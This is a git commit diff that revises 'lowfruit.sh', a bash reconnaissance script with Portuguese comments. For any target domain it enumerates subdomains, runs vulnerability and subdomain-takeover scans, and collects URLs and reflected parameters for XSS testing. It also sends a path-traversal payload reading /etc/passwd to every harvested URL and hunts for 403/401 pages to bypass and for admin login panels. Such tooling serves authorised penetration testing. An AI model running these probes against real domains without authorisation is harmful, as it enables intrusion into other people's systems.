4a65d96eac0784e0a915d67f27c017002764d860
1bat4’n <63245089+6bat66@users.noreply.github.com>
2022-11-10 13:42:05 -0300

    Update lowfruit.sh

--- lowfruit.sh
+++ lowfruit.sh
@@ -1,14 +1,12 @@
 #!/bin/bash
-    echo ""
     echo "MODO DE USO"
     echo "./lowfruit.sh <dominio> <arquivo de sudominios>"
     echo "Obs: Caso não tenha o arquivo de subdominios o script fara a enumeração sozinho"
     echo ""
 
-
 if [ "$2" == "" ]
 then
-    #------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------# 
+    #------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------#
     amass enum --passive -d $1 -o domains_$1
     assetfinder --subs-only $1 | tee -a domains_$1
 
@@ -19,23 +17,79 @@ then
     cat domains_$1 | filter-resolved | tee -a domains_$1.txt
     #------------------------- Usei meu outro script para enumeranção de subdominios ----------------------------------#
 
-    subzy -targets domains_$1 | tee subdomainTakeOver.txt #subdomain takeonver
-    cat domains_$1.txt | gau --subs --threads 5 | tee allUrls.txt; #Procurar URLs com base na internet 
-    grep "=" allUrls.txt | tee allParams.txt # Encontrar todos os parametros
-    cat allParams.txt | kxss | cut -d " " -f 2 | tee xsstest; # Encontrar parametros refletidos
-    httpx -l allUrls.txt -path "/////////////../../../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt; # Validar Path Transversal
-else 
-    subzy -targets domains_$1 | tee subdomainTakeOver.txt #subdomain takeonver
-    cat domains_$1.txt | gau --subs --threads 5 | tee allUrls.txt; #Procurar URLs com base na internet 
-    grep "=" allUrls.txt | tee allParams.txt # Encontrar todos os parametros
-    cat allParams.txt | kxss | cut -d " " -f 2 | tee xsstest; # Encontrar parametros refletidos
-    httpx -l allUrls.txt -path "/////////////../../../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt; # Validar Path Transversal
+    # Scaner de vuln
+    nuclei -l domains_$1.txt
 
-fi 
-#cat allUrls.txt | grep -i "\.log$" | tee log.txt;
-#cat allUrls.txt | grep -i "\.bak$" | tee bak.txt;
-#cat allUrls.txt | grep -i "\.xlsx$" | tee xlsx.txt;
-#cat allUrls.txt | grep -i "\.js$" | tee jsfiles.txt;
-#cat domains_$1 | grep -i "\.<>$" allUrls.txt | tee log.txt;
-#httpx -l allUrls.txt -mc 403 | tee 403s.txt; # Encontrar arquivos/direorios que nao temos acesso para tentar bypass
-#/home/kali/tools/403-bypass/403-bypass.py -U 403s.txt; # tentativa de bypass com outro script
+    # Subdomain takeonver
+    subzy -targets domains_$1 | tee subdomainTakeOver.txt
+
+    # Excluindo subdominios offline depois de tantar takeonver
+    rm domains_$1
+
+    # Procurar URLs com base na internet
+    cat domains_$1.txt | gau --subs --threads 5 | tee allUrls.txt
+
+    # Encontrar todos os parametros
+    grep "=" allUrls.txt | tee allParams.txt
+
+    # Encontrar parametros refletidos
+    cat allParams.txt | kxss | cut -d " " -f 2 | tee xsstest
+
+    # Validar Path Transversal
+    httpx -l allUrls.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt
+
+    # Encontrar extensões
+    mkdir ext
+    cat allUrls.txt | grep -i "\.log$" | tee ext/log.txt
+    cat allUrls.txt | grep -i "\.bak$" | tee ext/bak.txt
+    cat allUrls.txt | grep -i "\.xlsx$" | tee ext/xlsx.txt
+    cat allUrls.txt | grep -i "\.js$" | tee ext/jsfiles.txt
+
+    # Encontrar arquivos/direorios que nao temos acesso para tentar bypass
+    cat allUrls.txt | httpx -sc -nc | grep "403\|401" | tee bypass.txt
+
+    # Encontrar paineis administrativos
+    cat allUrls.txt | httpx -title | grep "admin\|login\|dashboard" | tee loginpanel.txt
+
+    echo ""
+    echo "Enumeração realizada"
+
+else
+
+    # Scaner de vuln
+    nuclei -l domains_$1.txt
+
+    # Subdomain takeonver
+    subzy -targets domains_$1 | tee subdomainTakeOver.txt
+
+    # Excluindo subdominios offline depois de tantar takeonver
+    rm domains_$1
+
+    # Procurar URLs com base na internet
+    cat domains_$1.txt | gau --subs --threads 5 | tee allUrls.txt
+
+    # Encontrar todos os parametros
+    grep "=" allUrls.txt | tee allParams.txt
+
+    # Encontrar parametros refletidos
+    cat allParams.txt | kxss | cut -d " " -f 2 | tee xsstest
+
+    # Validar Path Transversal
+    httpx -l allUrls.txt -path "///////../../../../../../etc/passwd" -status-code -mc 200 -ms 'root:' | tee pathTraversal.txt
+
+    # Encontrar extensões
+    mkdir ext
+    cat allUrls.txt | grep -i "\.log$" | tee ext/log.txt
+    cat allUrls.txt | grep -i "\.bak$" | tee ext/bak.txt
+    cat allUrls.txt | grep -i "\.xlsx$" | tee ext/xlsx.txt
+    cat allUrls.txt | grep -i "\.js$" | tee ext/jsfiles.txt
+
+    # Encontrar arquivos/direorios que nao temos acesso para tentar bypass
+    cat allUrls.txt | httpx -sc -nc | grep "403\|401" | tee bypass.txt
+
+    # Encontrar paineis administrativos
+    cat allUrls.txt | httpx -title | grep "admin\|login\|dashboard" | tee loginpanel.txt
+
+    echo ""
+    echo "Enumeração realizada"
+fi
